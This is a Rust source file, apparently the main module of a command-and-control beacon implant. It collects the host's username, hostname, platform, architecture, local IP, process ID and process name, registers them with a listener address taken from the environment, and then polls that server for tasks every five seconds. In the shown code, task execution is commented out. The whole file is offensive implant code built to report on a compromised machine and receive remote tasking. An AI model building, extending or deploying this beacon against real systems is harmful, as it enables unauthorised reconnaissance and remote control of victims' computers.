mod commands;
mod tasks;
mod transport;

use local_ip_address::local_ip;
use serde;
use std::{thread, time::Duration};

use transport::{ActiveTransport, Transport};

use whoami;

fn load_transport() -> ActiveTransport {
    ActiveTransport::new()
}

pub struct Beacon {
    id: String,
    listener_address: String,
}

impl Beacon {
    fn new() -> Self {
        Beacon {
            id: std::env::var("SESSION_ID").expect("no session id provided"),
            listener_address: std::env::var("LISTENER_ADDRESS")
                .expect("no listener address provided"),
        }
    }
}

#[derive(serde::Serialize, Debug)]
struct RegisterData {
    arch: String,
    platform: String,
    hostname: String,
    username: String,
    ip: String,
    pid: u32, // 1024
    process_name: String,
}

#[tokio::main]
async fn main() {
    let beacon = Beacon::new();

    println!("Beacon Session: {}", beacon.id);
    println!("Server: {}", beacon.listener_address);

    let client = load_transport();

    // Register the beacon
    let register_data = get_register_data();
    match client.post_data(&beacon, &register_data).await {
        Ok(_) => {
            println!("Successfully registered beacon.");
        }
        Err(e) => {
            eprintln!("Failed to register beacon: {}", e);
            return;
        }
    }

    loop {
        // Receive tasks/response
        match client.fetch_tasks(&beacon).await {
            Ok(tasks_data) => {
                if !tasks_data.is_empty() {
                    print!("Received tasks: {:?}\n", tasks_data);
                    // for task in tasks_data.iter() {
                    //     let mut tasks = tasks {
                    //         tasks: std::collections::vecdeque::new(),
                    //     };
                    //     if let err(e) = tasks.queue(task.clone()) {
                    //         eprintln!("failed to queue task {}: {}", task.id, e);
                    //         continue;
                    //     }
                    // }
                }
            }
            Err(e) => {
                eprintln!("Failed to receive data: {}", e);
            }
        }

        // Sleep
        let sleep_time = Duration::from_secs(5);
        println!("Sleeping for {:?}...", sleep_time);
        thread::sleep(sleep_time);
    }
}

fn get_register_data() -> RegisterData {
    let platform = whoami::platform().to_string();
    let username = whoami::username()
        .expect("failed to get username")
        .to_string();
    let hostname = whoami::hostname()
        .expect("failed to get hostname")
        .to_string();
    let arch = whoami::cpu_arch().to_string();
    let pid = std::process::id();
    let process_name = std::env::current_exe()
        .ok()
        .and_then(|path| {
            path.file_name()
                .map(|name| name.to_string_lossy().into_owned())
        })
        .unwrap_or_else(|| "unknown".to_string());

    let ip = local_ip().expect("failed to get local IP address");

    RegisterData {
        platform,
        username,
        hostname,
        arch,
        pid,
        process_name,
        ip: ip.to_string(),
    }
}
